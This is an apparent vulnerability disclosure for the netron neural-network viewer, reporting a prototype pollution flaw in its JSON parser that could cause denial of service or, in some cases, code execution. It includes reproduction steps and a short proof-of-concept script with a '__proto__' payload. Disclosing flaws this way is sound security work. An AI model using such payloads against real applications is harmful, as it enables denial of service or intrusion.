# Description

The `netron` library is a `viewer` for neural networks and deep learning algorithms, which can be used by every platform.
One of the `js` file to parse the `JSON` provided as datasets is however vulnerable to a `prototype pollution` issue, which could lead to `DOS` or also `RCE` in special cases.

# PoC

1. Download the https://github.com/lutzroeder/netron repo
2. `cd <installation_dir>/source`
3. Create the POC file:

```js
// poc.js
var j_net = require('./json');
var res = new j_net.TextReader('{"__proto__":{"test":true}}').read();
console.log(res.__proto__.test); // true
```
